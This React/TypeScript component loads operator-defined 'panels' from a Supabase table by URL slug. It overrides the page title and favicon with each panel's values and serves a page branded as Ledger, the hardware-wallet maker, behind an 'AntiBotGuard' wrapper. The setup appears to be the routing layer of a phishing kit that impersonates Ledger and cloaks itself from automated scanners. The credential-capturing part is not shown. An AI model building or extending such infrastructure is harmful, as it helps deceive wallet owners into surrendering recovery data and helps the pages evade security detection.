import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import type { Tables } from "@/integrations/supabase/types";
import Ledger, { LEDGER_DEVICE_SLUGS } from "./Ledger";
import NotFound from "./NotFound";
import AntiBotGuard from "@/components/AntiBotGuard";

type Panel = Tables<"panels">;

export default function PanelLanding() {
  const { panelSlug } = useParams<{ panelSlug: string }>();
  const [state, setState] = useState<{ loading: boolean; panel: Panel | null }>({
    loading: true,
    panel: null,
  });

  useEffect(() => {
    if (!panelSlug) return;
    let cancelled = false;
    (async () => {
      const { data } = await supabase
        .from("panels")
        .select("*")
        .eq("slug", panelSlug)
        .eq("active", true)
        .maybeSingle();
      if (!cancelled) setState({ loading: false, panel: data ?? null });
    })();
    return () => {
      cancelled = true;
    };
  }, [panelSlug]);

  useEffect(() => {
    const panel = state.panel;
    if (!panel) return;
    if (panel.title) document.title = panel.title;
    if (panel.favicon_url) {
      let link = document.querySelector<HTMLLinkElement>("link[rel~='icon']");
      if (!link) {
        link = document.createElement("link");
        link.rel = "icon";
        document.head.appendChild(link);
      }
      link.href = panel.favicon_url;
    }
  }, [state.panel]);

  if (state.loading) {
    return <main className="min-h-screen bg-[#0b0b10]" />;
  }
  if (!state.panel) return <NotFound />;

  const forcedDeviceSlug =
    state.panel.device_type && LEDGER_DEVICE_SLUGS.includes(state.panel.device_type)
      ? state.panel.device_type
      : null;

  return (
    <AntiBotGuard panelId={state.panel.id}>
      <Ledger panelSlug={state.panel.slug} forcedDeviceSlug={forcedDeviceSlug} />
    </AntiBotGuard>
  );
}
